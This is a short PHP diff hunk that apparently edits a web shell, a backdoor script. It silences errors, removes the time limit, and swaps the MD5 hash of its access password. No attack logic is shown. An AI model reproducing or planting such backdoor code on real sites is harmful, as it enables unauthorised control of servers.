@@ -4,7 +4,7 @@
 // kocak
 set_time_limit(0);
 error_reporting(0);
-$auth_pass ="e2d0017f68cf287c501652b2644e0a62";
+$auth_pass ="8ecd58e134c5c619e3c548a84180a46d";
 if(get_magic_quotes_gpc()) {   
 function VEstripslashes($array) {     
 return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array);   }   
